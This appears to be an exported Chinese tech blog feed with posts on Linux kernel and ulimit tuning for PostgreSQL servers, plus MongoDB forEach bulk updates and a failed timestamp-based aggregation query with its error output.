如果Oracle数据库，要使用aio的话，需要设置它。 设置它也没什么坏处，如果将来需要适应异步IO，可以不需要重新修改这个设置。 ``` 2\. 参数 ``` fs.file-max ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` file-max & file-nr: . The value in file-max denotes the maximum number of file handles that the Linux kernel will allocate. . When you get lots of error messages about running out of file handles, you might want to increase this limit. . Historically, the kernel was able to allocate file handles dynamically, but not to free them again. . The three values in file-nr denote : the number of allocated file handles , the number of allocated but unused file handles , the maximum number of file handles. . Linux 2.6 always reports 0 as the number of free file handles -- this is not an error, it just means that the number of allocated file handles exactly matches the number of used file handles. . Attempts to allocate more file descriptors than file-max are reported with printk, look for "VFS: file-max limit reached". ``` 推荐设置 ``` fs.file-max = 7xxxxxxx . PostgreSQL 有一套自己管理的VFS，真正打开的FD与内核管理的文件打开关闭有一套映射的机制，所以真实情况不需要使用那么多的file handlers。 max_files_per_process 参数。 假设1GB内存支撑100个连接，每个连接打开1000个文件，那么一个PG实例需要打开10万个文件，一台机器按512G内存来算可以跑500个PG实例，则需要5000万个file handler。 以上设置绰绰有余。 ``` 3\. 参数 ``` kernel.core_pattern ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` core_pattern: . core_pattern is used to specify a core dumpfile pattern name. . max length 128 characters; default value is "core" . core_pattern is used as a pattern template for the output filename; certain string patterns (beginning with '%') are substituted with their actual values. . backward compatibility with core_uses_pid: If core_pattern does not include "%p" (default does not) and core_uses_pid is set, then .PID will be appended to the filename. . corename format specifiers: % '%' is dropped %% output one '%' %p pid %P global pid (init PID namespace) %i tid %I global tid (init PID namespace) %u uid %g gid %d dump mode, matches PR_SET_DUMPABLE and /proc/sys/fs/suid_dumpable %s signal number %t UNIX time of dump %h hostname %e executable filename (may be shortened) %E executable path % both are dropped . If the first character of the pattern is a '|', the kernel will treat the rest of the pattern as a command to run. The core dump will be written to the standard input of that program instead of to a file. ``` 推荐设置 ``` kernel.core_pattern = /xxx/core_%e_%u_%t_%s.%p . 这个目录要777的权限，如果它是个软链，则真实目录需要777的权限 mkdir /xxx chmod 777 /xxx 留足够的空间 ``` 4\. 参数 ``` kernel.sem ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` kernel.sem = 4096 2147483647 2147483646 512000 . 4096 每组多少信号量 (>=17, PostgreSQL 每16个进程一组, 每组需要17个信号量) , 2147483647 总共多少信号量 (2^31-1 , 且大于4096*512000 ) , 2147483646 每个semop()调用支持多少操作 (2^31-1), 512000 多少组信号量 (假设每GB支持100个连接, 512GB支持51200个连接, 加上其他进程, > 51200*2/16 绰绰有余) . # sysctl -w kernel.sem="4096 2147483647 2147483646 512000" . # ipcs -s -l ------ Semaphore Limits -------- max number of arrays = 512000 max semaphores per array = 4096 max semaphores system wide = 2147483647 max ops per semop call = 2147483646 semaphore max value = 32767 ``` 推荐设置 ``` kernel.sem = 4096 2147483647 2147483646 512000 . 4096可能能够适合更多的场景, 所以大点无妨，关键是512000 arrays也够了。 ``` 5\. 参数 ``` kernel.shmall = 107374182 kernel.shmmax = 274877906944 kernel.shmmni = 819200 ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` 假设主机内存 512GB . shmmax 单个共享内存段最大 256GB (主机内存的一半，单位字节) shmall 所有共享内存段加起来最大 (主机内存的80%，单位PAGE) shmmni 一共允许创建819200个共享内存段 (每个数据库启动需要2个共享内存段。 将来允许动态创建共享内存段，可能需求量更大) . # getconf PAGE_SIZE 4096 ``` 推荐设置 ``` kernel.shmall = 107374182 kernel.shmmax = 274877906944 kernel.shmmni = 819200 . 9.2以及以前的版本，数据库启动时，对共享内存段的内存需求非常大，需要考虑以下几点 Connections: (1800 + 270 * max_locks_per_transaction) * max_connections Autovacuum workers: (1800 + 270 * max_locks_per_transaction) * autovacuum_max_workers Prepared transactions: (770 + 270 * max_locks_per_transaction) * max_prepared_transactions Shared disk buffers: (block_size + 208) * shared_buffers WAL buffers: (wal_block_size + 8) * wal_buffers Fixed space requirements: 770 kB . 以上建议参数根据9.2以前的版本设置，后期的版本同样适用。 ``` 6\. 参数 ``` net.core.netdev_max_backlog ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` netdev_max_backlog ------------------ Maximum number of packets, queued on the INPUT side, when the interface receives packets faster than kernel can process them. ``` 推荐设置 ``` net.core.netdev_max_backlog=1xxxx . INPUT链表越长，处理耗费越大，如果用了iptables管理的话，需要加大这个值。 ``` 7\. 参数 ``` net.core.rmem_default net.core.rmem_max net.core.wmem_default net.core.wmem_max ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` rmem_default ------------ The default setting of the socket receive buffer in bytes. . rmem_max -------- The maximum receive socket buffer size in bytes. . wmem_default ------------ The default setting (in bytes) of the socket send buffer. . wmem_max -------- The maximum send socket buffer size in bytes. ``` 推荐设置 ``` net.core.rmem_default = 262144 net.core.rmem_max = 4194304 net.core.wmem_default = 262144 net.core.wmem_max = 4194304 ``` 8\. 参数 ``` net.core.somaxconn ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` somaxconn - INTEGER Limit of socket listen() backlog, known in userspace as SOMAXCONN. Defaults to 128. See also tcp_max_syn_backlog for additional tuning for TCP sockets. ``` 推荐设置 ``` net.core.somaxconn=4xxx ``` 9\. 参数 ``` net.ipv4.tcp_max_syn_backlog ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` tcp_max_syn_backlog - INTEGER Maximal number of remembered connection requests, which have not received an acknowledgment from connecting client. The minimal value is 128 for low memory machines, and it will increase in proportion to the memory of machine. If server suffers from overload, try increasing this number. ``` 推荐设置 ``` net.ipv4.tcp_max_syn_backlog=4xxx pgpool-II 使用了这个值，用于将超过num_init_child以外的连接queue。 所以这个值决定了有多少连接可以在队列里面等待。 ``` 10\. 参数 ``` net.ipv4.tcp_keepalive_intvl=20 net.ipv4.tcp_keepalive_probes=3 net.ipv4.tcp_keepalive_time=60 ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` tcp_keepalive_time - INTEGER How often TCP sends out keepalive messages when keepalive is enabled. Default: 2hours. . tcp_keepalive_probes - INTEGER How many keepalive probes TCP sends out, until it decides that the connection is broken. Default value: 9. . tcp_keepalive_intvl - INTEGER How frequently the probes are send out. Multiplied by tcp_keepalive_probes it is time to kill not responding connection, after probes started. Default value: 75sec i.e. connection will be aborted after ~11 minutes of retries. ``` 推荐设置 ``` net.ipv4.tcp_keepalive_intvl=20 net.ipv4.tcp_keepalive_probes=3 net.ipv4.tcp_keepalive_time=60 . 连接空闲60秒后, 每隔20秒发心跳包, 尝试3次心跳包没有响应，关闭连接。 从开始空闲，到关闭连接总共历时120秒。 ``` 11\. 参数 ``` net.ipv4.tcp_mem=8388608 12582912 16777216 ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` tcp_mem - vector of 3 INTEGERs: min, pressure, max 单位 page min: below this number of pages TCP is not bothered about its memory appetite. . pressure: when amount of memory allocated by TCP exceeds this number of pages, TCP moderates its memory consumption and enters memory pressure mode, which is exited when memory consumption falls under "min". . max: number of pages allowed for queueing by all TCP sockets. . Defaults are calculated at boot time from amount of available memory. 64GB 内存，自动计算的值是这样的 net.ipv4.tcp_mem = 1539615 2052821 3079230 . 512GB 内存，自动计算得到的值是这样的 net.ipv4.tcp_mem = 49621632 66162176 99243264 . 这个参数让操作系统启动时自动计算，问题也不大 ``` 推荐设置 ``` net.ipv4.tcp_mem=8388608 12582912 16777216 . 这个参数让操作系统启动时自动计算，问题也不大 ``` 12\. 参数 ``` net.ipv4.tcp_fin_timeout ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` tcp_fin_timeout - INTEGER The length of time an orphaned (no longer referenced by any application) connection will remain in the FIN_WAIT_2 state before it is aborted at the local end. While a perfectly valid "receive only" state for an un-orphaned connection, an orphaned connection in FIN_WAIT_2 state could otherwise wait forever for the remote to close its end of the connection. Cf. tcp_max_orphans Default: 60 seconds ``` 推荐设置 ``` net.ipv4.tcp_fin_timeout=5 . 加快僵尸连接回收速度 ``` 13\. 参数 ``` net.ipv4.tcp_synack_retries ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` tcp_synack_retries - INTEGER Number of times SYNACKs for a passive TCP connection attempt will be retransmitted. Should not be higher than 255. Default value is 5, which corresponds to 31seconds till the last retransmission with the current initial RTO of 1second. With this the final timeout for a passive TCP connection will happen after 63seconds. ``` 推荐设置 ``` net.ipv4.tcp_synack_retries=2 . 缩短tcp syncack超时时间 ``` 14\. 参数 ``` net.ipv4.tcp_syncookies ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` tcp_syncookies - BOOLEAN Only valid when the kernel was compiled with CONFIG_SYN_COOKIES Send out syncookies when the syn backlog queue of a socket overflows. This is to prevent against the common 'SYN flood attack' Default: 1 . Note, that syncookies is fallback facility. It MUST NOT be used to help highly loaded servers to stand against legal connection rate. If you see SYN flood warnings in your logs, but investigation shows that they occur because of overload with legal connections, you should tune another parameters until this warning disappear. See: tcp_max_syn_backlog, tcp_synack_retries, tcp_abort_on_overflow. . syncookies seriously violate TCP protocol, do not allow to use TCP extensions, can result in serious degradation of some services (f.e. SMTP relaying), visible not by you, but your clients and relays, contacting you. While you see SYN flood warnings in logs not being really flooded, your server is seriously misconfigured. . If you want to test which effects syncookies have to your network connections you can set this knob to 2 to enable unconditionally generation of syncookies. ``` 推荐设置 ``` net.ipv4.tcp_syncookies=1 . 防止syn flood攻击 ``` 15\. 参数 ``` net.ipv4.tcp_timestamps ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` tcp_timestamps - BOOLEAN Enable timestamps as defined in RFC1323. ``` 推荐设置 ``` net.ipv4.tcp_timestamps=1 . tcp_timestamps 是 tcp 协议中的一个扩展项，通过时间戳的方式来检测过来的包以防止 PAWS(Protect Against Wrapped Sequence numbers)，可以提高 tcp 的性能。 ``` 16\. 参数 ``` net.ipv4.tcp_tw_recycle net.ipv4.tcp_tw_reuse net.ipv4.tcp_max_tw_buckets ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` tcp_tw_recycle - BOOLEAN Enable fast recycling TIME-WAIT sockets. Default value is 0. It should not be changed without advice/request of technical experts. . tcp_tw_reuse - BOOLEAN Allow to reuse TIME-WAIT sockets for new connections when it is safe from protocol viewpoint. Default value is 0. It should not be changed without advice/request of technical experts. . tcp_max_tw_buckets - INTEGER Maximal number of timewait sockets held by system simultaneously. If this number is exceeded time-wait socket is immediately destroyed and warning is printed. This limit exists only to prevent simple DoS attacks, you _must_ not lower the limit artificially, but rather increase it (probably, after increasing installed memory), if network conditions require more than default value. ``` 推荐设置 ``` net.ipv4.tcp_tw_recycle=0 net.ipv4.tcp_tw_reuse=1 net.ipv4.tcp_max_tw_buckets = 2xxxxx . net.ipv4.tcp_tw_recycle和net.ipv4.tcp_timestamps不建议同时开启 ``` 17\. 参数 ``` net.ipv4.tcp_rmem net.ipv4.tcp_wmem ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` tcp_wmem - vector of 3 INTEGERs: min, default, max min: Amount of memory reserved for send buffers for TCP sockets. Each TCP socket has rights to use it due to fact of its birth. Default: 1 page . default: initial size of send buffer used by TCP sockets. This value overrides net.core.wmem_default used by other protocols. It is usually lower than net.core.wmem_default. Default: 16K . max: Maximal amount of memory allowed for automatically tuned send buffers for TCP sockets. This value does not override net.core.wmem_max. Calling setsockopt() with SO_SNDBUF disables automatic tuning of that socket's send buffer size, in which case this value is ignored. Default: between 64K and 4MB, depending on RAM size. . tcp_rmem - vector of 3 INTEGERs: min, default, max min: Minimal size of receive buffer used by TCP sockets. It is guaranteed to each TCP socket, even under moderate memory pressure. Default: 1 page . default: initial size of receive buffer used by TCP sockets. This value overrides net.core.rmem_default used by other protocols. Default: 87380 bytes. This value results in window of 65535 with default setting of tcp_adv_win_scale and tcp_app_win:0 and a bit less for default tcp_app_win. See below about these variables. . max: maximal size of receive buffer allowed for automatically selected receiver buffers for TCP socket. This value does not override net.core.rmem_max. Calling setsockopt() with SO_RCVBUF disables automatic tuning of that socket's receive buffer size, in which case this value is ignored. Default: between 87380B and 6MB, depending on RAM size. ``` 推荐设置 ``` net.ipv4.tcp_rmem=8192 87380 16777216 net.ipv4.tcp_wmem=8192 65536 16777216 . 许多数据库的推荐设置，提高网络性能 ``` 18\. 参数 ``` net.nf_conntrack_max net.netfilter.nf_conntrack_max ``` 支持系统 ``` CentOS 6 ``` 参数解释 ``` nf_conntrack_max - INTEGER Size of connection tracking table. Default value is nf_conntrack_buckets value * 4. ``` 推荐设置 ``` net.nf_conntrack_max=1xxxxxx net.netfilter.nf_conntrack_max=1xxxxxx ``` 19\. 参数 ``` vm.dirty_background_bytes vm.dirty_expire_centisecs vm.dirty_ratio vm.dirty_writeback_centisecs ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` ============================================================== . dirty_background_bytes . Contains the amount of dirty memory at which the background kernel flusher threads will start writeback. . Note: dirty_background_bytes is the counterpart of dirty_background_ratio. Only one of them may be specified at a time. When one sysctl is written it is immediately taken into account to evaluate the dirty memory limits and the other appears as 0 when read. . ============================================================== . dirty_background_ratio . Contains, as a percentage of total system memory, the number of pages at which the background kernel flusher threads will start writing out dirty data. . ============================================================== . dirty_bytes . Contains the amount of dirty memory at which a process generating disk writes will itself start writeback. . Note: dirty_bytes is the counterpart of dirty_ratio. Only one of them may be specified at a time. When one sysctl is written it is immediately taken into account to evaluate the dirty memory limits and the other appears as 0 when read. . Note: the minimum value allowed for dirty_bytes is two pages (in bytes); any value lower than this limit will be ignored and the old configuration will be retained. . ============================================================== . dirty_expire_centisecs . This tunable is used to define when dirty data is old enough to be eligible for writeout by the kernel flusher threads. It is expressed in 100'ths of a second. Data which has been dirty in-memory for longer than this interval will be written out next time a flusher thread wakes up. . ============================================================== . dirty_ratio . Contains, as a percentage of total system memory, the number of pages at which a process which is generating disk writes will itself start writing out dirty data. . ============================================================== . dirty_writeback_centisecs . The kernel flusher threads will periodically wake up and write `old' data out to disk. This tunable expresses the interval between those wakeups, in 100'ths of a second. . Setting this to zero disables periodic writeback altogether. . ============================================================== ``` 推荐设置 ``` vm.dirty_background_bytes = 4096000000 vm.dirty_expire_centisecs = 6000 vm.dirty_ratio = 80 vm.dirty_writeback_centisecs = 50 . 减少数据库进程刷脏页的频率，dirty_background_bytes根据实际IOPS能力以及内存大小设置 ``` 20\. 参数 ``` vm.extra_free_kbytes ``` 支持系统 ``` CentOS 6 ``` 参数解释 ``` extra_free_kbytes . This parameter tells the VM to keep extra free memory between the threshold where background reclaim (kswapd) kicks in, and the threshold where direct reclaim (by allocating processes) kicks in. . This is useful for workloads that require low latency memory allocations and have a bounded burstiness in memory allocations, for example a realtime application that receives and transmits network traffic (causing in-kernel memory allocations) with a maximum total message burst size of 200MB may need 200MB of extra free memory to avoid direct reclaim related latencies. . 目标是尽量让后台进程回收内存，比用户进程提早多少kbytes回收，因此用户进程可以快速分配内存。 ``` 推荐设置 ``` vm.extra_free_kbytes=4xxxxxx ``` 21\. 参数 ``` vm.min_free_kbytes ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` min_free_kbytes: . This is used to force the Linux VM to keep a minimum number of kilobytes free. The VM uses this number to compute a watermark[WMARK_MIN] value for each lowmem zone in the system. Each lowmem zone gets a number of reserved free pages based proportionally on its size. . Some minimal amount of memory is needed to satisfy PF_MEMALLOC allocations; if you set this to lower than 1024KB, your system will become subtly broken, and prone to deadlock under high loads. . Setting this too high will OOM your machine instantly. ``` 推荐设置 ``` vm.min_free_kbytes = 2xxxxxx # vm.min_free_kbytes 建议每32G内存分配1G vm.min_free_kbytes. 防止在高负载时系统无响应，减少内存分配死锁概率。 ``` 22\. 参数 ``` vm.mmap_min_addr ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` mmap_min_addr . This file indicates the amount of address space which a user process will be restricted from mmapping. Since kernel null dereference bugs could accidentally operate based on the information in the first couple of pages of memory userspace processes should not be allowed to write to them. By default this value is set to 0 and no protections will be enforced by the security module. Setting this value to something like 64k will allow the vast majority of applications to work correctly and provide defense in depth against future potential kernel bugs. ``` 推荐设置 ``` vm.mmap_min_addr=6xxxx . 防止内核隐藏的BUG导致的问题 ``` 23\. 参数 ``` vm.overcommit_memory vm.overcommit_ratio ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` ============================================================== . overcommit_kbytes: . When overcommit_memory is set to 2, the committed address space is not permitted to exceed swap plus this amount of physical RAM. See below. . Note: overcommit_kbytes is the counterpart of overcommit_ratio. Only one of them may be specified at a time. Setting one disables the other (which then appears as 0 when read). . ============================================================== . overcommit_memory: . This value contains a flag that enables memory overcommitment. . When this flag is 0, the kernel attempts to estimate the amount of free memory left when userspace requests more memory. . When this flag is 1, the kernel pretends there is always enough memory until it actually runs out. . When this flag is 2, the kernel uses a "never overcommit" policy that attempts to prevent any overcommit of memory. Note that user_reserve_kbytes affects this policy. . This feature can be very useful because there are a lot of programs that malloc() huge amounts of memory "just-in-case" and don't use much of it. . The default value is 0. . See Documentation/vm/overcommit-accounting and security/commoncap.c::cap_vm_enough_memory() for more information. . ============================================================== . overcommit_ratio: . When overcommit_memory is set to 2, the committed address space is not permitted to exceed swap + this percentage of physical RAM. See above. . ============================================================== ``` 推荐设置 ``` vm.overcommit_memory = 0 vm.overcommit_ratio = 90 . vm.overcommit_memory = 0 时 vm.overcommit_ratio可以不设置 ``` 24\. 参数 ``` vm.swappiness ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` swappiness . This control is used to define how aggressive the kernel will swap memory pages. Higher values will increase agressiveness, lower values decrease the amount of swap. . The default value is 60. ``` 推荐设置 ``` vm.swappiness = 0 ``` 25\. 参数 ``` vm.zone_reclaim_mode ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` zone_reclaim_mode: . Zone_reclaim_mode allows someone to set more or less aggressive approaches to reclaim memory when a zone runs out of memory. If it is set to zero then no zone reclaim occurs. Allocations will be satisfied from other zones / nodes in the system. . This is value ORed together of . 1 = Zone reclaim on 2 = Zone reclaim writes dirty pages out 4 = Zone reclaim swaps pages . zone_reclaim_mode is disabled by default. For file servers or workloads that benefit from having their data cached, zone_reclaim_mode should be left disabled as the caching effect is likely to be more important than data locality. . zone_reclaim may be enabled if it's known that the workload is partitioned such that each partition fits within a NUMA node and that accessing remote memory would cause a measurable performance reduction. The page allocator will then reclaim easily reusable pages (those page cache pages that are currently not used) before allocating off node pages. . Allowing zone reclaim to write out pages stops processes that are writing large amounts of data from dirtying pages on other nodes. Zone reclaim will write out dirty pages if a zone fills up and so effectively throttle the process. This may decrease the performance of a single process since it cannot use all of system memory to buffer the outgoing writes anymore but it preserve the memory on other nodes so that the performance of other processes running on other nodes will not be affected. . Allowing regular swap effectively restricts allocations to the local node unless explicitly overridden by memory policies or cpuset configurations. ``` 推荐设置 ``` vm.zone_reclaim_mode=0 . 不使用NUMA ``` 26\. 参数 ``` net.ipv4.ip_local_port_range ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` ip_local_port_range - 2 INTEGERS Defines the local port range that is used by TCP and UDP to choose the local port. The first number is the first, the second the last local port number. The default values are 32768 and 61000 respectively. . ip_local_reserved_ports - list of comma separated ranges Specify the ports which are reserved for known third-party applications. These ports will not be used by automatic port assignments (e.g. when calling connect() or bind() with port number 0). Explicit port allocation behavior is unchanged. . The format used for both input and output is a comma separated list of ranges (e.g. "1,2-4,10-10" for ports 1, 2, 3, 4 and 10). Writing to the file will clear all previously reserved ports and update the current list with the one given in the input. . Note that ip_local_port_range and ip_local_reserved_ports settings are independent and both are considered by the kernel when determining which ports are available for automatic port assignments. . You can reserve ports which are not in the current ip_local_port_range, e.g.: . $ cat /proc/sys/net/ipv4/ip_local_port_range 32000 61000 $ cat /proc/sys/net/ipv4/ip_local_reserved_ports 8080,9148 . although this is redundant. However such a setting is useful if later the port range is changed to a value that will include the reserved ports. . Default: Empty ``` 推荐设置 ``` net.ipv4.ip_local_port_range=40000 65535 . 限制本地动态端口分配范围，防止占用监听端口。 ``` 27\. 参数 ``` vm.nr_hugepages ``` 支持系统 ``` CentOS 6, 7 ``` 参数解释 ``` ============================================================== nr_hugepages Change the minimum size of the hugepage pool. See Documentation/vm/hugetlbpage.txt ============================================================== nr_overcommit_hugepages Change the maximum size of the hugepage pool. The maximum is nr_hugepages + nr_overcommit_hugepages. See Documentation/vm/hugetlbpage.txt . The output of "cat /proc/meminfo" will include lines like: ...... HugePages_Total: vvv HugePages_Free: www HugePages_Rsvd: xxx HugePages_Surp: yyy Hugepagesize: zzz kB . where: HugePages_Total is the size of the pool of huge pages. HugePages_Free is the number of huge pages in the pool that are not yet allocated. HugePages_Rsvd is short for "reserved," and is the number of huge pages for which a commitment to allocate from the pool has been made, but no allocation has yet been made. Reserved huge pages guarantee that an application will be able to allocate a huge page from the pool of huge pages at fault time. HugePages_Surp is short for "surplus," and is the number of huge pages in the pool above the value in /proc/sys/vm/nr_hugepages. The maximum number of surplus huge pages is controlled by /proc/sys/vm/nr_overcommit_hugepages. . /proc/filesystems should also show a filesystem of type "hugetlbfs" configured in the kernel. . /proc/sys/vm/nr_hugepages indicates the current number of "persistent" huge pages in the kernel's huge page pool. "Persistent" huge pages will be returned to the huge page pool when freed by a task. A user with root privileges can dynamically allocate more or free some persistent huge pages by increasing or decreasing the value of 'nr_hugepages'. ``` 推荐设置 ``` 如果要使用PostgreSQL的huge page，建议设置它。 大于数据库需要的共享内存即可。 ``` 28\. 参数 fs.nr_open12支持系统 CentOS 6, 712参数解释 nr_open: This denotes the maximum number of file-handles a process canallocate. Default value is 1024*1024 (1048576) which should beenough for most machines. Actual limit depends on RLIMIT_NOFILEresource limit. 它还影响security/limits.conf 的文件句柄限制，单个进程的打开句柄不能大于fs.nr_open，所以要加大文件句柄限制，首先要加大nr_open 推荐设置 对于有很多对象（表、视图、索引、序列、物化视图等）的PostgreSQL数据库，建议设置为2000万，例如fs.nr_open=20480000 ## 数据库关心的资源限制 1\. 通过/etc/security/limits.conf设置，或者ulimit设置 2\. 通过/proc/$pid/limits查看当前进程的设置 - core - limits the core file size (KB)- memlock - max locked-in-memory address space (KB)- nofile - max number of open files 建议设置为1000万 , 但是必须设置sysctl, fs.nr_open大于它，否则会导致系统无法登陆。- nproc - max number of processes以上四个是非常关心的配置…. - data - max data size (KB)- fsize - maximum filesize (KB)- rss - max resident set size (KB)- stack - max stack size (KB)- cpu - max CPU time (MIN)- as - address space limit (KB)- maxlogins - max number of logins for this user- maxsyslogins - max number of logins on the system- priority - the priority to run user process with- locks - max number of file locks the user can hold- sigpending - max number of pending signals- msgqueue - max memory used by POSIX message queues (bytes)- nice - max nice priority allowed to raise to values: [-20, 19]- rtprio - max realtime priority ## 数据库关心的IO调度规则 1\. 目前操作系统支持的IO调度策略包括cfq, deadline, noop 等。 /kernel-doc-xxx/Documentation/block-r–r–r– 1 root root 674 Apr 8 16:33 00-INDEX-r–r–r– 1 root root 55006 Apr 8 16:33 biodoc.txt-r–r–r– 1 root root 618 Apr 8 16:33 capability.txt-r–r–r– 1 root root 12791 Apr 8 16:33 cfq-iosched.txt-r–r–r– 1 root root 13815 Apr 8 16:33 data-integrity.txt-r–r–r– 1 root root 2841 Apr 8 16:33 deadline-iosched.txt-r–r–r– 1 root root 4713 Apr 8 16:33 ioprio.txt-r–r–r– 1 root root 2535 Apr 8 16:33 null_blk.txt-r–r–r– 1 root root 4896 Apr 8 16:33 queue-sysfs.txt-r–r–r– 1 root root 2075 Apr 8 16:33 request.txt-r–r–r– 1 root root 3272 Apr 8 16:33 stat.txt-r–r–r– 1 root root 1414 Apr 8 16:33 switching-sched.txt-r–r–r– 1 root root 3916 Apr 8 16:33 writeback_cache_control.txt 如果你要详细了解这些调度策略的规则，可以查看WIKI或者看内核文档。 从这里可以看到它的调度策略 cat /sys/block/vdb/queue/schedulernoop [deadline] cfq 修改 echo deadline > /sys/block/hda/queue/scheduler 或者修改启动参数 grub.confelevator=deadline` 从很多测试结果来看，数据库使用deadline调度，性能会更稳定一些。 其他1. 关闭透明大页 2. 禁用NUMA 3. SSD的对齐 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb 的 forEach用法]]></title>
    <url>%2F2019%2F05%2F21%2Fmongodb-forEach%2F</url>
    <content type="text"><![CDATA[努力不一定会成功，可不努力会很轻松哦 MongoDB forEach 说明forEach方法中的function回调有三个参数: 遍历的数组内容 对应的数组索引 数组本身 MongoDB forEach 使用案例MongoDB数据插入、删除、更新、批量更新某个字段批量更新某个字段 例112345db.getCollection('bond_sentiment_news').find({"source" : 2,"siteUrl" : "http://www.21jingji.com/"}).forEach( function(item){ db.getCollection('bond_sentiment_news').update({"_id":item._id},{$set:{"siteName":"21经济网"}}) }) 例212345db.getCollection('my_booking').find({"hospitalName":/xx医院/,openId:/^2/}).forEach( function(item){ db.getCollection('my_booking').update({"_id":item._id},{$set:{"payType": "1"}}) }) 查询出hospitalName是xx医院和openId以2开头的所有记录，并且更新my_booking表中的payType为1. 例312345db.getCollection('my_booking').find({"hospitalName":/运城市中心医院/,openId:{$not:/^2/}}).forEach( function(item){ db.getCollection('my_booking').update({"_id":item._id},{$set:{"outTradeNo1": item.outTradeNo2}}) }) 查询出xx医院和不已2开头的openId的所有记录，并且将每条记录的outTradeNo2赋值给outTradeNo1. MongoDB 数组遍历操作 forEach12345db.User.find().forEach( function(item){ db.User.update({"_id":item._id},{"$set":{"LastUpdate":item.CreateAt}},false,true) }) MongoDB 更新每条数据某个字段的值例112345678910111213141516var begin = 1499675090;var end = 1499675198;var t = begin;while(t]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mongodb aggregate 基于UNIX时间戳的聚合]]></title>
    <url>%2F2019%2F05%2F20%2Fmongodb-aggregate%2F</url>
    <content type="text"><![CDATA[对今天解决不了的事情，也不要着急。因为明天也可能还是解决不了。 前提开发找我问MongoDB 的 aggregate 聚合用过不😰 。 我说查查资料吧，发现是aggregate聚合管道 😨 。 把SQL 与 Aggergation 对比下😂 SQL Terms, Functions, and Concepts MongoDB Aggregation Operators WHERE $match HAVING $match SELECT $project ORDER BY $sort LIMIT $limit SUM() $sum COUNT() $sum COUNT() $sortByCount join $lookup 开发的需求是: 按照天分组，统计一下数量 经过查看MongoDB官网的aggregate资料实现开发的需求 实现查询数据的状态1db.antispam_image.find({"moduleId":5,createTs:{$gte:1554048000},createTs:{$lt:1556640000}}).pretty().limit(1); 1234567891011121314151617181920212223242526272829303132333435363738{ "_id" : ObjectId("5c125657372eecd7a0a54e5e"), "adRate" : 0, "assoId" : "223794113", "assoType" : 201, "clientIp" : "183.131.7.23", "clientType" : "", "confidence" : 12.655, "content" : "****http://videoplayer.babytreeimg.com/lamavideo:2018/1213/Flb_T4qsxRcK7suNqaHo2JbD6zWJ_000001.jpg?id=-1\**", "createTs" : NumberLong(1544705623), "emailStatus" : "verified", "handleTs" : NumberLong(1545036013), "hotScore" : 14.285, "inspectStatus" : 2, "message" : "", "moduleId" : NumberLong(5), "normalScore" : 73.25, "ocrKeyword" : [ ], "ocrText" : [ ], "opUser" : "fanyanning", "opUserId" : NumberLong(31648494), "pornScore" : 12.464, "qcode" : 0, "receiveTs" : NumberLong(1545035885), "regTs" : NumberLong(1475385061), "requestId" : "6f078c58-1235-4816-96a5-e876ea0cbcf2", "rotOcrKeyword" : [ ], "rotOcrText" : [ ], "ruleId" : NumberLong(10019), "sim" : 0, "status" : 1000, "trashType" : 0, "ts" : NumberLong(1544705623), "url" : "http://videoplayer.babytreeimg.com/lamavideo:2018/1213/Flb_T4qsxRcK7suNqaHo2JbD6zWJ_000001.jpg?id=-1", "userId" : NumberLong(56349617), "userLevel" : 3, "version" : "1.0.0"} 开发给的聚合的查询1234db.antispam_image.aggregate([{ $match: {"moduleId":5,createTs:{$gte:1554048000},createTs:{$lt:1556640000}}},{ $group: {_id :{$dateToString: {format: "%Y-%m-%d", date: "$createTs" }},count: { $sum: 1 }}}]); 1234567891011121314151617181920212223242526mgset-11469021:SECONDARY> db.antispam_image.aggregate([{$match: {"moduleId":5, createTs:{$gte:1554048000},createTs:{$lt:1556640000}}}, {$group: {_id: {$dateToString: {format: "%Y-%m-%d", date: "$createTs"}}, count: {$sum: 1}}}]);assert: command failed: { "operationTime" : Timestamp(1558347069, 2), "ok" : 0, "errmsg" : "can't convert from BSON type long to Date", "code" : 16006, "codeName" : "Location16006"} : aggregate failed_getErrorWithCode@src/mongo/shell/utils.js:25:13doassert@src/mongo/shell/assert.js:16:14assert.commandWorked@src/mongo/shell/assert.js:370:5DBCollection.prototype.aggregate@src/mongo/shell/collection.js:1319:5@(shell):1:12019-05-20T18:11:10.818+0800 E QUERY [thread1] Error: command failed: { "operationTime" : Timestamp(1558347069, 2), "ok" : 0, "errmsg" : "can't convert from BSON type long to Date", "code" : 16006, "codeName" : "Location16006"} : aggregate failed :_getErrorWithCode@src/mongo/shell/utils.js:25:13doassert@src/mongo/shell/assert.js:16:14assert.commandWorked@src/mongo/shell/assert.js:370:5DBCollection.prototype.aggregate@src/mongo/shell/collection.js:1319:5@(shell):1:1 